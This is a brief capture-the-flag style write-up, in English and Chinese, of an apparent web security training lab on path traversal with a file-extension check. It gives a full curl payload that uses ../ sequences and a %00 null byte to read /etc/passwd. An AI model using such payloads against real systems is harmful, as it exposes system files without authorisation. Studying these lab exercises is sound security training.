# Lab: File path traversal, validation of file extension with null byte bypass

This lab contains a file path traversal vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the /etc/passwd file.

## LFI
* 題目說要期望的副檔名，就是 .jpg，阿用 null byte 截斷就可以了
```
payload = curl https://acc81f591e7106fec0dc0720009c0005.web-security-academy.net/image\?filename\=../../../../../../etc/passwd%00.jpg
```